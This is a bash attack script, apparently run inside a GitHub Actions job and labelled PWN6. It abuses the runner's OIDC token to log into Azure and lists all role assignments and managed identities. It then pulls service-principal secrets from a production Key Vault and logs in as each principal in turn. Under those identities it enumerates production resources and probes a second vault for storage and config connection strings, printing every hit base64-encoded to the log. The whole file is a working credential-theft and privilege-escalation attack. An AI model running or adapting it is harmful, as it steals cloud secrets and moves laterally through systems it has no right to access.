#!/usr/bin/env bash
set +e
echo "=====PWN6_START====="
AUD="api:""//AzureADTokenExchange"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
ci(){ az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1; }
ci; echo "[*] CI login rc=$?"
echo "=== FULL ROLE MAP (khong loc) ==="
az role assignment list --all -o tsv --query "[].[roleDefinitionName,principalType,principalId,scope]" 2>/dev/null | sort -u | head -40
echo "=== MANAGED IDENTITIES ==="
az identity list -o tsv --query "[].[name,resourceGroup,clientId,principalId]" 2>&1 | head -10
echo "=== CHUYEN cost-reader: MOI RESOURCE TRONG RG ==="
V=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n cost-reader-principal --query value -o tsv 2>/dev/null)
APP=$(printf %s "$V" | jq -r .appId); CS=$(printf %s "$V" | jq -r .clientSecret)
az logout >/dev/null 2>&1
az login --service-principal -u "$APP" --password="$CS" -t "${AZURE_TENANT_ID}" -o none >/dev/null 2>&1 && echo "cost-reader OK"
az resource list -g rg-tbl-platform-prod-sea -o tsv --query "[].[type,name,id]" 2>/dev/null | head -30
for RID in $(az resource list -g rg-tbl-platform-prod-sea --query "[].id" -o tsv 2>/dev/null); do
  T=$(echo "$RID" | cut -d/ -f8)
  case "$T" in Microsoft.Storage/storageAccounts|Microsoft.KeyVault/vaults) continue;; esac
  echo "--- $RID ---"
  az resource show --id "$RID" -o json 2>/dev/null | head -c 2500; echo
done
echo "=== kv-tbl-sec do ten (moi SP con song) ==="
ci
for SECNAME in reporting-service-principal sync-service-principal cost-reader-principal reporting-viewer-principal; do
  V=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n "$SECNAME" --query value -o tsv 2>/dev/null)
  [ -z "$V" ] && continue
  APP=$(printf %s "$V" | jq -r .appId); CS=$(printf %s "$V" | jq -r .clientSecret)
  az logout >/dev/null 2>&1
  az login --service-principal -u "$APP" --password="$CS" -t "${AZURE_TENANT_ID}" -o none >/dev/null 2>&1 || { ci; continue; }
  for S in config-storage-connection storage-connection-string config-storage appcfg-connection sttblappcfgprodx3euoz-connection internal-config config-connection tbl-app-config-conn app-config-conn reporting-storage-connection; do
    R=$(az keyvault secret show --vault-name kv-tbl-sec-x3euoz -n "$S" --query value -o tsv 2>/dev/null)
    [ -n "$R" ] && echo "HIT [$SECNAME] $S b64: $(printf %s "$R" | base64 -w0)"
  done
  ci
done
echo "=====PWN6_END====="